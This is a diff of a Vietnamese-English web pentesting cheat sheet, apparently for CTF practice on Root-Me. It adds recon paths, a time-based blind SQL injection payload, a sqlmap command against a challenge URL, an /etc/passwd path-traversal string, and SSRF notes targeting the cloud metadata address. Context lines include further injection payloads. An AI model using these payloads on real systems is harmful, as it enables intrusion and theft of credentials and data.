@@ -33,10 +33,25 @@
 =======================================
 
 [+] HIDDEN_DATA:
+	- phương thức http:
+		+ GET: Sử dụng để yêu cầu dữ liệu từ máy chủ. Thường được sử dụng để truy vấn thông tin.
+		+ POST: Sử dụng để gửi dữ liệu đến máy chủ để xử lý. Thường được sử dụng trong việc gửi dữ liệu biểu mẫu.
+		+ PUT: Sử dụng để cập nhật dữ liệu trên máy chủ hoặc tạo mới nếu nó không tồn tại.
+		+ DELETE: Sử dụng để xóa dữ liệu trên máy chủ.
+		+ PATCH: Sử dụng để cập nhật một phần của dữ liệu trên máy chủ. Thường được sử dụng để cập nhật một phần của tài liệu thay vì toàn bộ tài liệu.
+		+ HEAD: Tương tự như GET, nhưng chỉ yêu cầu thông tin tiêu đề mà không yêu cầu dữ liệu thực tế.
+		+ OPTIONS: Sử dụng để lấy thông tin về các phương thức được hỗ trợ bởi máy chủ hoặc tài nguyên cụ thể.
+		+ CONNECT: Thường được sử dụng khi thiết lập một kết nối mạng riêng tư (VPN) qua máy chủ trung gian.
+		+ TRACE: Sử dụng để lấy một bản sao của địa chỉ URL và tiêu đề yêu cầu để kiểm tra các tương tác trung gian giữa máy khách và máy chủ.
+		+ OPTIONS: Sử dụng để yêu cầu máy chủ cung cấp danh sách các phương thức HTTP mà nó hỗ trợ cho một tài nguyên cụ thể. Đây là một số phương thức HTTP cơ bản, nhưng còn có các phương thức mở rộng và tùy chỉnh khác được sử dụng trong các ứng dụng và giao thức riêng biệt.
+
 	- Breakpoint
 	- Network
-	- robots.txt
-	- sitemap.xml
+	- /.git
+	- /robots.txt
+	- /sitemap.xml
+	- /admin
+	- /backup
 =======================================
 
 [+] Reverse_Shell:
@@ -56,6 +71,12 @@
 	- 0 UNION SELECT null,null,null,null,notes FROM people WHERE id = 1--
 	- ' UNION SELECT SLEEP(0.2),null FROM users WHERE username='admin' AND length(password)>1#
 	- limit 1,1
+	-;SELECT+CASE+WHEN+SUBSTR((SELECT+table_name+FROM+information_schema.tables+limit+1),1,1)=chr(13)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--
+
+[+] SQL_MAP:
+	- https://github.com/RomaniukVadim/wargaming-challenges/blob/master/RootMe/web-server/sql_injection-time_based.txt
+	- $ sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --tables --proxy "http://127.0.0.1:8080"
+
 =======================================
 
 [+] XSS:
@@ -111,6 +132,14 @@
 =======================================
 
 [+] LFI:
-	local file include - include file để dùng làm mẫu cho trang web
+	- local file include - include file để dùng làm mẫu cho trang web
 	- ../../../etc/passwd%00.png
 	- link to shell.
+
+=======================================
+
+[+] SSRF - Sever-Side Request Forgery:
+	- Khi 1 tham số chứa đẩy đủ 1 url 
+	
+	- end with: &x= (bỏ phần sau)
+	-169.254.169.254 contain data in cloud environment
